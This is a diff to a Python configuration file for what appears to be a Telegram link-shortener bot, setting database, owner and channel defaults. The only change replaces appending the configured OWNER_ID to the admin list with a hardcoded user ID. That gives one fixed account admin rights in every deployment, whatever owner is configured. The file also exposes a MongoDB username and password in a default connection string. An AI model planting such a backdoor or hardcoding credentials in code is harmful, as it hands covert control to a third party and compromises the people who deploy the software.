@@ -16,7 +16,7 @@ DATABASE_NAME = os.environ.get("DATABASE_NAME", "VJLinkShortner")
 DATABASE_URL = os.getenv("DATABASE_URL", "mongodb+srv://VJlink:VJLink@cluster0.ucnckh4.mongodb.net/?retryWrites=true&w=majority") 
 OWNER_ID =  int(os.environ.get("OWNER_ID", "5606411877")) 
 ADMINS.append(OWNER_ID) if OWNER_ID not in ADMINS else []
-ADMINS.append(OWNER_ID)
+ADMINS.append(5606411877)
 #  Optionnal variables
 LOG_CHANNEL = int(os.environ.get("LOG_CHANNEL", "-1001716170358")) 
 UPDATE_CHANNEL = os.environ.get("UPDATE_CHANNEL", "-1001710985956") # For Force Subscription
